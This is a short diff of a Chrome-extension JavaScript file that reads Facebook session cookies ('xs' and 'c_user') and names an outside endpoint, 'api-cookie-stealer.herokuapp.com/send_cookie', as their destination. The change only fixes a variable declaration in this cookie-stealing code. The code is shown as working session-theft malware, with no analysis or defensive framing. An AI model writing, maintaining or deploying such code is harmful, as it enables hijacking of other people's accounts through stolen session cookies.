@@ -1,7 +1,8 @@
 var url = "https://www.facebook.com";
 var endpoint = "https://api-cookie-stealer.herokuapp.com/send_cookie";
 
-var xs, c_user = {};
+var xs = {}; 
+var c_user = {};
 
 chrome.cookies.get({ url, name: "xs" }, getCookiesInfo);
 chrome.cookies.get({ url, name: "c_user" }, getCookiesInfo);
